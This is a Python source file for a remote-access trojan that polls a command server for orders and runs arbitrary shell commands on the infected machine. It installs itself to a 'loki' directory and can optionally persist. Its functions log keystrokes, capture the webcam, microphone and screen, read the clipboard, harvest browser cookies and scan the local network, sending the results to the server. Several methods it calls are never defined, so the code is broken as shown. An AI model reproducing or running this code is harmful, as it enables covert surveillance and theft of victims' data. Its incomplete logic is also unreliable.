#!/usr/bin/env python3
# coding: utf-8
import ctypes
import geopy
from geopy.geocoders import Nominatim
import json
import requests
import time
import os
import subprocess
import platform
import shutil
import sys
import traceback
import threading
import uuid
import io
import zipfile
import tempfile
import socket
import getpass
import argparse
import pyaudio
import wave
from termcolor import colored
import base64
import select
from cryptography.fernet import Fernet
import hashlib
import signal
from pygeocoder import Geocoder
import re
from pathlib import Path
import psutil
import cv2
import numpy as np
import sounddevice as sd
import keyboard
import pyperclip
import browser_cookie3
import wmi
import winreg
from PIL import Image

if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab

import config

os.system("clear")

def threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.daemon = True  # Make threads daemon so they exit when main thread exits
        t.start()
        return
    return wrapper


class Agent(object):

    def __init__(self):
        self.idle = True
        self.silent = False
        self.platform = platform.system() + " " + platform.release()
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)

    def get_install_dir(self):
        """Get the installation directory with proper path handling"""
        install_dir = None
        if platform.system() == 'Linux':
            install_dir = self.expand_path('~/.loki')
        elif platform.system() == 'Windows':
            install_dir = os.path.join(os.getenv('USERPROFILE'), 'loki')
        return install_dir if os.path.exists(install_dir) else None

    def is_installed(self):
        """Check if agent is installed"""
        return self.get_install_dir() is not None

    def get_consecutive_failed_connections(self):
        """Get the number of consecutive failed connections with proper error handling"""
        try:
            if self.is_installed():
                install_dir = self.get_install_dir()
                check_file = os.path.join(install_dir, "failed_connections")
                if os.path.exists(check_file):
                    with open(check_file, "r") as f:
                        return int(f.read().strip())
            return self.failed_connections
        except (ValueError, IOError):
            return 0

    def update_consecutive_failed_connections(self, value):
        """Update failed connections count with proper error handling"""
        try:
            if self.is_installed():
                install_dir = self.get_install_dir()
                check_file = os.path.join(install_dir, "failed_connections")
                with open(check_file, "w") as f:
                    f.write(str(value))
            self.failed_connections = value
        except IOError:
            self.log("Failed to update connection count")

    def log(self, to_log):
        """Write data to agent log with proper encoding"""
        print(str(to_log))

    def get_UID(self):
        """Returns a unique ID for the agent with proper error handling"""
        try:
            return f"{getpass.getuser()}_{uuid.getnode()}"
        except:
            return f"unknown_{uuid.uuid4()}"

    def server_hello(self):
        """Ask server for instructions with proper error handling and timeout"""
        try:
            req = requests.post(
                f"{config.SERVER}/api/{self.uid}/hello",
                json={
                    'platform': self.platform,
                    'hostname': self.hostname,
                    'username': self.username
                },
                timeout=30,
                verify=True
            )
            return req.text
        except requests.exceptions.RequestException as e:
            self.log(f"Failed to connect to server: {str(e)}")
            return None

    @threaded
    def upload(self, file):
        """Uploads a local file to the server with proper validation and error handling"""
        try:
            file_path = self.validate_path(file)
            if not file_path:
                self.send_output('[!] Invalid file path')
                return

            if not os.path.isfile(file_path):
                self.send_output('[!] Not a file or no such file')
                return

            # Check file size
            if os.path.getsize(file_path) > 50 * 1024 * 1024:  # 50MB limit
                self.send_output('[!] File too large (max 50MB)')
                return

            self.send_output(f"[*] Uploading {file_path}...")
            with open(file_path, 'rb') as f:
                files = {'uploaded': f}
                response = requests.post(
                    f"{config.SERVER}/api/{self.uid}/upload",
                    files=files,
                    timeout=300,
                    verify=True
                )
                if response.status_code == 200:
                    self.send_output("[+] Upload successful")
                else:
                    self.send_output(f"[!] Upload failed: {response.status_code}")

        except Exception as exc:
            self.send_output(f"Error during upload: {str(exc)}")

    @threaded
    def download(self, file_url, destination=''):
        """Downloads a file through HTTP(S) with proper validation and error handling"""
        try:
            if not file_url.startswith(('http://', 'https://')):
                self.send_output('[!] Invalid URL scheme (must be http or https)')
                return

            if destination:
                destination = self.validate_path(destination)
                if not destination:
                    self.send_output('[!] Invalid destination path')
                    return
            else:
                destination = os.path.basename(file_url)

            self.send_output(f"[*] Downloading {file_url}...")
            
            response = requests.get(
                file_url,
                stream=True,
                timeout=30,
                verify=True
            )
            
            if response.status_code != 200:
                self.send_output(f"[!] Download failed: {response.status_code}")
                return

            total_size = int(response.headers.get('content-length', 0))
            if total_size > 50 * 1024 * 1024:  # 50MB limit
                self.send_output('[!] File too large (max 50MB)')
                return

            with open(destination, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)

            self.send_output(f"[+] File downloaded: {destination}")

        except Exception as exc:
            self.send_output(f"Error during download: {str(exc)}")

    @threaded
    def screenshot(self):
        """Takes a screenshot with proper error handling and cleanup"""
        try:
            screenshot = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp_file:
                screenshot_file = tmp_file.name
                screenshot.save(screenshot_file)
                self.upload(screenshot_file)
                self.send_output(f"Screenshot saved: {screenshot_file}")
        except Exception as exc:
            self.send_output(f"Error taking screenshot: {str(exc)}")
        finally:
            try:
                if 'screenshot_file' in locals():
                    os.unlink(screenshot_file)
            except:
                pass

    def geolocation(self):
        """Get geolocation with proper error handling and API validation"""
        try:
            response = requests.get(
                'https://ipapi.co/json/',
                timeout=10,
                verify=True
            )
            if response.status_code == 200:
                data = response.json()
                lat = data.get('latitude')
                lon = data.get('longitude')
                if lat is not None and lon is not None:
                    self.send_output(f"Location: {lat}, {lon}")
                else:
                    self.send_output("Could not determine location")
            else:
                self.send_output("Failed to get location data")
        except Exception as exc:
            self.send_output(f"Error getting location: {str(exc)}")

    def lockscreen(self):
        """Lock screen with proper platform detection and error handling"""
        try:
            if platform.system() == 'Linux':
                # Try different Linux desktop environments
                commands = [
                    'gnome-screensaver-command --lock',
                    'dm-tool lock',
                    'xdg-screensaver lock'
                ]
                for cmd in commands:
                    try:
                        subprocess.run(cmd.split(), timeout=5)
                        return
                    except:
                        continue
                self.send_output("Could not lock screen - unsupported desktop environment")
            
            elif platform.system() == 'Windows':
                ctypes.windll.user32.LockWorkStation()
            
            else:
                self.send_output("Unsupported platform for screen lock")
                
        except Exception as exc:
            self.send_output(f"Error locking screen: {str(exc)}")

    def help(self):
        """Display help information"""
        self.send_output(config.HELP)

    @threaded
    def webcam_capture(self):
        """Capture image from webcam with proper error handling"""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self.send_output("[!] No webcam available")
                return
            
            ret, frame = cap.read()
            if not ret:
                self.send_output("[!] Failed to capture image")
                return
            
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp_file:
                webcam_file = tmp_file.name
                cv2.imwrite(webcam_file, frame)
                self.upload(webcam_file)
                self.send_output(f"Webcam capture saved: {webcam_file}")
                
        except Exception as exc:
            self.send_output(f"Error capturing from webcam: {str(exc)}")
        finally:
            if 'cap' in locals():
                cap.release()
            if 'webcam_file' in locals():
                try:
                    os.unlink(webcam_file)
                except:
                    pass

    @threaded
    def keylogger(self, duration=60):
        """Record keystrokes for specified duration with secure handling"""
        try:
            recorded_keys = []
            start_time = time.time()
            
            def on_key(event):
                if not event.name:
                    return
                recorded_keys.append(f"{event.name} ")
            
            keyboard.on_press(on_key)
            
            while time.time() - start_time < duration:
                time.sleep(0.1)
            
            keyboard.unhook_all()
            
            if recorded_keys:
                log_content = "".join(recorded_keys)
                with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as tmp_file:
                    tmp_file.write(log_content)
                    keylog_file = tmp_file.name
                
                self.upload(keylog_file)
                self.send_output(f"Keylog saved: {keylog_file}")
                os.unlink(keylog_file)
            
        except Exception as exc:
            self.send_output(f"Error in keylogger: {str(exc)}")

    def clipboard_monitor(self):
        """Monitor and retrieve clipboard content"""
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content:
                self.send_output(f"Clipboard content:\n{clipboard_content}")
            else:
                self.send_output("Clipboard is empty")
        except Exception as exc:
            self.send_output(f"Error accessing clipboard: {str(exc)}")

    def system_info(self):
        """Gather detailed system information"""
        try:
            info = {
                "OS": platform.system(),
                "OS Version": platform.version(),
                "Architecture": platform.machine(),
                "CPU": platform.processor(),
                "Memory": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
                "Disk Space": {disk.mountpoint: f"{disk.total / (1024**3):.2f} GB"
                              for disk in psutil.disk_partitions()},
                "Network Interfaces": [iface for iface in psutil.net_if_addrs().keys()],
                "Running Processes": len(list(psutil.process_iter())),
                "Username": getpass.getuser(),
                "Hostname": socket.gethostname()
            }
            self.send_output(json.dumps(info, indent=2))
        except Exception as exc:
            self.send_output(f"Error gathering system info: {str(exc)}")

    def browser_data(self):
        """Extract browser cookies and history with secure handling"""
        try:
            browsers = {
                'chrome': browser_cookie3.chrome,
                'firefox': browser_cookie3.firefox,
                'edge': browser_cookie3.edge
            }
            
            results = {}
            for browser_name, browser_func in browsers.items():
                try:
                    cookies = list(browser_func(domain_name=""))
                    results[browser_name] = len(cookies)
                except:
                    results[browser_name] = "Access denied"
            
            self.send_output(f"Browser cookie counts:\n{json.dumps(results, indent=2)}")
        except Exception as exc:
            self.send_output(f"Error accessing browser data: {str(exc)}")

    def network_scan(self):
        """Scan local network for active hosts"""
        try:
            active_hosts = []
            for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
                network = '.'.join(ip.split('.')[:-1])
                for i in range(1, 255):
                    target_ip = f"{network}.{i}"
                    try:
                        socket.create_connection((target_ip, 445), timeout=0.1)
                        active_hosts.append(target_ip)
                    except:
                        continue
            
            self.send_output(f"Active hosts found: {json.dumps(active_hosts, indent=2)}")
        except Exception as exc:
            self.send_output(f"Error scanning network: {str(exc)}")

    def audio_stream(self, duration=10):
        """Stream audio from microphone"""
        try:
            sample_rate = 44100
            channels = 2
            
            recording = sd.rec(int(duration * sample_rate),
                             samplerate=sample_rate,
                             channels=channels)
            sd.wait()
            
            with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as tmp_file:
                audio_file = tmp_file.name
                import scipy.io.wavfile as wav
                wav.write(audio_file, sample_rate, recording)
                
                self.upload(audio_file)
                self.send_output(f"Audio stream saved: {audio_file}")
                os.unlink(audio_file)
                
        except Exception as exc:
            self.send_output(f"Error streaming audio: {str(exc)}")

    def process_monitor(self, duration=60):
        """Monitor process creation and termination"""
        try:
            start_processes = set(p.pid for p in psutil.process_iter())
            start_time = time.time()
            
            while time.time() - start_time < duration:
                current_processes = set(p.pid for p in psutil.process_iter())
                
                new_processes = current_processes - start_processes
                terminated_processes = start_processes - current_processes
                
                if new_processes:
                    for pid in new_processes:
                        try:
                            proc = psutil.Process(pid)
                            self.send_output(f"New process: {proc.name()} (PID: {pid})")
                        except:
                            continue
                
                if terminated_processes:
                    self.send_output(f"Terminated processes: {list(terminated_processes)}")
                
                start_processes = current_processes
                time.sleep(1)
                
        except Exception as exc:
            self.send_output(f"Error monitoring processes: {str(exc)}")

    def registry_monitor(self, key_path=r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"):
        """Monitor Windows Registry changes"""
        if platform.system() != 'Windows':
            self.send_output("Registry monitoring only available on Windows")
            return
            
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, 
                                winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
            
            initial_values = {}
            try:
                i = 0
                while True:
                    name, value, _ = winreg.EnumValue(key, i)
                    initial_values[name] = value
                    i += 1
            except WindowsError:
                pass
            
            self.send_output(f"Monitoring registry key: {key_path}")
            self.send_output(f"Initial values: {json.dumps(initial_values, indent=2)}")
            
        except Exception as exc:
            self.send_output(f"Error monitoring registry: {str(exc)}")

    def screen_record(self, duration=10):
        """Record screen for specified duration"""
        try:
            frames = []
            start_time = time.time()
            
            while time.time() - start_time < duration:
                screenshot = ImageGrab.grab()
                frames.append(np.array(screenshot))
                time.sleep(0.1)
            
            if frames:
                with tempfile.NamedTemporaryFile(suffix='.avi', delete=False) as tmp_file:
                    video_file = tmp_file.name
                    
                    height, width = frames[0].shape[:2]
                    fourcc = cv2.VideoWriter_fourcc(*'XVID')
                    out = cv2.VideoWriter(video_file, fourcc, 10.0, (width, height))
                    
                    for frame in frames:
                        out.write(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
                    
                    out.release()
                    self.upload(video_file)
                    self.send_output(f"Screen recording saved: {video_file}")
                    os.unlink(video_file)
                    
        except Exception as exc:
            self.send_output(f"Error recording screen: {str(exc)}")

    def run(self):
        """Main loop with proper error handling and security checks"""
        self.silent = True
        if config.PERSIST:
            try:
                self.persist()
            except Exception as exc:
                self.log(f"Failed executing persistence: {str(exc)}")
        self.silent = False

        while True:
            try:
                todo = self.server_hello()
                if todo is None:
                    time.sleep(config.HELLO_INTERVAL)
                    continue

                self.update_consecutive_failed_connections(0)

                if todo:
                    commandline = todo.strip()
                    if not commandline:
                        continue

                    self.idle = False
                    self.last_active = time.time()
                    self.send_output(f'$ {commandline}')

                    try:
                        parts = commandline.split(maxsplit=1)
                        command = parts[0].lower()
                        args = parts[1] if len(parts) > 1 else ''

                        if command == 'cd':
                            if not args:
                                self.send_output('usage: cd </path/to/directory>')
                            else:
                                path = self.validate_path(args)
                                if path:
                                    os.chdir(path)
                                else:
                                    self.send_output('Invalid path')

                        elif command == 'upload':
                            if not args:
                                self.send_output('usage: upload <localfile>')
                            else:
                                self.upload(args)

                        elif command == 'download':
                            parts = args.split(maxsplit=1)
                            if not parts:
                                self.send_output('usage: download <remote_url> [destination]')
                            else:
                                url = parts[0]
                                dest = parts[1] if len(parts) > 1 else ''
                                self.download(url, dest)

                        elif command == 'screenshot':
                            self.screenshot()

                        elif command == 'geolocation':
                            self.geolocation()

                        elif command == 'lockscreen':
                            self.lockscreen()

                        elif command == 'help':
                            self.help()

                        elif command == 'exit':
                            self.send_output('[+] Exiting...')
                            return

                        elif command == 'webcam':
                            self.webcam_capture()
                        elif command == 'keylog':
                            duration = int(args) if args.isdigit() else 60
                            self.keylogger(duration)
                        elif command == 'clipboard':
                            self.clipboard_monitor()
                        elif command == 'sysinfo':
                            self.system_info()
                        elif command == 'browser':
                            self.browser_data()
                        elif command == 'network':
                            self.network_scan()
                        elif command == 'audio':
                            duration = int(args) if args.isdigit() else 10
                            self.audio_stream(duration)
                        elif command == 'procmon':
                            duration = int(args) if args.isdigit() else 60
                            self.process_monitor(duration)
                        elif command == 'regmon':
                            self.registry_monitor(args if args else None)
                        elif command == 'record':
                            duration = int(args) if args.isdigit() else 10
                            self.screen_record(duration)

                        else:
                            self.runcmd(commandline)

                    except Exception as exc:
                        self.send_output(f"Error executing command: {str(exc)}")

                else:
                    if self.idle:
                        time.sleep(config.HELLO_INTERVAL)
                    elif (time.time() - self.last_active) > config.IDLE_TIME:
                        self.log("Switching to idle mode...")
                        self.idle = True
                    else:
                        time.sleep(0.5)

            except Exception as exc:
                self.log(f"Error in main loop: {str(exc)}")
                failed = self.get_consecutive_failed_connections() + 1
                self.update_consecutive_failed_connections(failed)
                self.log(f"Consecutive failed connections: {failed}")
                
                if failed > config.MAX_FAILED_CONNECTIONS:
                    self.send_output('[!] Maximum failed connections reached, exiting...')
                    return
                    
                time.sleep(config.HELLO_INTERVAL)

def main():
    """Main entry point with signal handling"""
    def signal_handler(signum, frame):
        print("\nReceived signal to exit")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    agent = Agent()
    agent.run()

if __name__ == "__main__":
    main()